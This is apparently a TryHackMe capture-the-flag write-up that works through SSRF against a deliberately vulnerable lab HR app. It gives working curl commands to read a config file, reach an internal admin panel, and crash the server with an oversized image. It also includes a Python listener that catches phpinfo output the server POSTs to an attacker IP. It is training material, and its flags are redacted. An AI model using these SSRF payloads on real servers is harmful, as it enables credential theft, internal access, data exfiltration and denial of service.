# Advanced Server-Side Attacks - SSRF (TryHackMe)

- **Path:** Web Application Pentesting > Advanced Server-Side Attacks.
- **Room:** SSRF (~60 min) - basic, blind/out-of-band, time-based SSRF, plus an SSRF-driven DoS,
  demonstrated against a deliberately vulnerable HRMS web app.
- **Date:** 2026-11-10.
- **Target:** `hrms.thm` -> `<ip>:80` (Apache/2.4.41, Ubuntu; PHP 7.4.3). The app also talks to an
  internal back-end server on a private `<ip>`.
- **Method:** Driven entirely headless over the THM VPN with `curl --resolve hrms.thm:80:<ip>` and a
  cookie jar; the out-of-band task used a tiny Python listener bound to my VPN IP `<ip>:8080`.
- **Status:** SOLVED - method below; **answers/flags left out on purpose so you solve it yourself.**

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | Avg Weighted Impact for SSRF (OWASP Top 10) | *(find it yourself)* |
| 3 | HRMS login username | *(find it yourself)* |
| 3 | HRMS login password | `<redacted-pw>` |
| 3 | Admin URL per the config file | *(find it yourself)* |
| 3 | Flag after logging in | `THM{…}` |
| 4 | Non-routable addresses reachable if vulnerable? | *(find it yourself)* |
| 4 | Flag after accessing the admin panel | `THM{…}` |
| 5 | Does OOB SSRF always give a direct response? | *(find it yourself)* |
| 5 | Virtual Directory Support (phpinfo) | *(find it yourself)* |
| 5 | PHP Extension Build | *(find it yourself)* |
| 5 | SSRF type with no direct response/feedback | *(find it yourself)* |
| 6 | Flag after loading a >100 KB image | `THM{…}` |
| 7 | Suggested approach for trusted URLs | *(find it yourself)* |
| 7 | Is sanitising input URLs optional? | *(find it yourself)* |

Task 1 and Task 8 need no answer (verify HRMS loads / room complete).

## Setup (headless over VPN)

The app keys everything off the `hrms.thm` hostname, so instead of editing `/etc/hosts` I pin it per
request. A cookie jar preserves `PHPSESSID` across login.

```bash
R="--resolve hrms.thm:80:<ip>"
JAR=./hrms.cookies
curl -s -i $R "http://hrms.thm/"        # 302 -> ?url=localhost/copyright  (Apache, PHP session set)
```

## Task 2 - OWASP figure (theory)

Read it straight off the room's OWASP table. Note the question asks **Avg Weighted Impact**, which is a
*different column* from Avg Weighted Exploit - don't grab the wrong one. SSRF is A10 in the 2021 Web Top
10 and ranks #7 in the OWASP API Top 10.

## Task 3 - Basic SSRF against the local server

The app loads pages via `?url=localhost/<page>` with no validation (`file_get_contents(ROOTPATH.$file)`),
so it will read any local file it can resolve. Point it at the config to leak the creds:

```bash
curl -s $R "http://hrms.thm/?url=localhost/config"   # footer renders config.php
```

Footer output (redacted - the creds are the answers):

```php
<?php
$adminURL = "http://<ip>/admin.php";
$username = "<username>";
$password = "<redacted-pw>";
```

Log in with the leaked creds (the form POSTs to `/copyright`):

```bash
curl -s -i $R -c $JAR -b $JAR -L \
  --data-urlencode "username=<username>" --data-urlencode "password=<redacted-pw>" \
  "http://hrms.thm/copyright"
# 302 -> logged-in  ->  the page renders "Flag: THM{…}"
```

## Task 4 - Basic SSRF to an internal server (the admin panel)

`admin.php` lives on the back-end internal host, not routable from outside. The dashboard
(`/details` -> `details.php`) has a category dropdown that POSTs `category=<internal-url>` and the
server fetches it for you:

```html
<form method="post" action="" name="myForm" id="myForm">
  <select name="category" id="category">
    <option value="http://<ip>/employee.php">Employee</option>
    <option value="http://<ip>/salary.php">Salary</option>
```

Forge the value to the admin endpoint (no browser inspector needed - just POST it):

```bash
curl -s $R -c $JAR -b $JAR \
  --data-urlencode "category=http://<ip>/admin.php" \
  "http://hrms.thm/details.php"
# -> renders the admin panel with "Flag: THM{…}"
```

The takeaway: a non-routable internal host is reachable *through* the vulnerable server.

## Task 5 - Blind / Out-of-band SSRF (phpinfo exfil)

`profile.php?url=<dst>` makes the server POST its own `phpinfo()` output to `<dst>` with **no response
shown to the attacker** - classic blind/OOB. Stand up a listener on your VPN IP and point the server at it.

Listener (`catch.py`, logs each POST body to a file):

```python
import http.server, socketserver, sys
port = int(sys.argv[1]); OUT = sys.argv[2]
class H(http.server.BaseHTTPRequestHandler):
    def _h(self): self.send_response(200); self.end_headers()
    def do_GET(self): self._h(); self.wfile.write(b'ok')
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        open(OUT, 'ab').write(self.rfile.read(n) + b'\n=====END=====\n')
        self._h(); self.wfile.write(b'THM ok')
    def log_message(self, *a): pass
socketserver.TCPServer(('0.0.0.0', port), H).serve_forever()
```

```bash
python -I catch.py 8080 capture.txt &                       # bind to your VPN IP
curl -s $R -c $JAR -b $JAR "http://hrms.thm/profile.php?url=http://<ip>:8080"
# ~83 KB of phpinfo POSTed back within a second
grep -aoE "Virtual Directory Support.*|API[0-9]+,(NTS|TS)" capture.txt   # the two Task 5 values
```

The two Task 5 values (Virtual Directory Support, PHP Extension Build) fall straight out of the captured
`phpinfo()` - *read them off yourself.* The room also notes **semi-blind / time-based** SSRF: infer
success from response latency when there's no body and no callback channel.

## Task 6 - SSRF-driven DoS (crash the server)

`url.php?id=<host>/<image>` fetches and base64-embeds a remote image, but crashes once the image
exceeds 100 KB (`if ($imageSize < 100) { ... } else { /* memory outage */ }`). A conveniently large
image is staged on the internal host:

```bash
curl -s $R -c $JAR -b $JAR "http://hrms.thm/url.php?id=<ip>/bigImage.jpg"
# -> the response carries "Flag: THM{…}"
```

(You can confirm `url.php` is a basic SSRF first with any `?id=<ip>` - it will happily fetch an
arbitrary host.)

## Task 7 - Remediation (theory)

- Trusted URLs: prefer an **allowlist** of trusted URLs/domains over trying to blocklist bad ones.
- Sanitising input URLs is **not** optional. Layer it with network segmentation, blocking
  link-local/metadata ranges, least-privilege egress, and logging/alerting on outbound fetches.

## Lessons learned

- **One `url=`/`id=`/`category=` param drives the whole room.** Every task is the same primitive
  (server fetches an attacker-chosen destination); only the destination and the sink differ:
  `localhost/<file>` (read local), an internal `admin.php` (reach internal), `http://<me>:8080`
  (OOB exfil), oversized image (DoS).
- **Blind != useless.** No reflected body just means you need a side channel - here a plain HTTP
  listener on the VPN IP caught the full `phpinfo()` the server helpfully POSTed out.
- **The dropdown "Inspect Element" step is just a POST.** `category=` is a server-side fetch target;
  curling the forged value is faster and headless-friendly than editing `<option>` in a browser.
- **Mind the OWASP columns.** Weighted Impact vs Weighted Exploit are adjacent cells; the question asks
  impact.
- Related: [ssrf-introduction](ssrf-introduction.md) (Jr Pen Tester intro room - regular vs blind,
  allow/deny lists, cloud metadata), [file-inclusion](file-inclusion.md) (sibling "server reads an
  attacker-controlled path" sink).

## Reproduction notes

- No `/etc/hosts` edit: `curl --resolve hrms.thm:80:<lab-ip>` pins the vhost per request.
- Cookie jar required - the dashboard (`/details`, `/profile.php`, `/url.php`) checks the login session.
- OOB callback needs the listener bound to the **VPN** IP, reachable from the box; a cloud/AttackBox IP
  works identically.
- Flags use a `THM{...}` shape with leet punctuation inside.
